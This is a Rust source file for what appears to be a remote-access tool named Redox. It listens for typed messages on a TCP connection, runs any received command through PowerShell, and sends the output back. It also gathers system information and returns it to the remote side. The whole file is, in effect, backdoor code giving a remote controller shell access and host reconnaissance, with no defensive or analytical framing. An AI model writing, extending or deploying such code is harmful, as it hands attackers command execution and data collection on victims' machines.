use tokio::net::TcpStream;
use Redox::ReturnedData;
use Redox::schema::sys::SysInfo;
use Redox::utils::network::send_text;

pub async fn handle_recived_data(tcp_stream: &mut TcpStream, data: ReturnedData) {
    match data.datatype.as_str() {
        "2" => {
            let command = String::from_utf8(data.data).unwrap();
            handle_shell(tcp_stream, command).await;
        }
        "3" => {
            handle_get_system_info(tcp_stream).await;
        }
        _ => {}
    }
}

pub async fn handle_get_system_info(tcp_stream: &mut TcpStream) {
    println!("aa");
    let system_info = SysInfo::get().to_json().to_string();
    send_text(tcp_stream, &system_info).await.unwrap();
}

pub async fn handle_shell(tcp_stream: &mut TcpStream, command: String) {
    let output = std::process::Command::new("powershell")
        .arg("-c")
        .arg(command)
        .output()
        .expect("failed to execute process");
    let output = output.stdout;
    send_text(tcp_stream, &String::from_utf8(output).unwrap()).await.unwrap();
}